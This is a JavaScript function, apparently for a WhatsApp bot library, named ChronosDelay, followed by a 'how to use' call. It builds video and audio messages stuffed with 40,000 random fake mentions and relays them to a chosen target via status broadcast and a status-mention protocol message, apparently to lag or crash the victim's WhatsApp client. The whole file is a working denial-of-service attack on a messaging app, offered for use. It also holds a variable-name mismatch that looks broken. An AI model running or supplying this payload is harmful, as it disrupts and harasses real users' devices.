async function ChronosDelay(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const letakx = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Xrelly Mp5",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Xrelly Mp5"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ARE YOU KIDDING ME?!!!",
        title: "Xrl",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const xaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { xletak } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, xaudio, {});
  
    for (const msg of [msg1, msg2]) {
        await tdx.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await tdx.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           

//Cara Pakai
await ChronosDelay(target, true)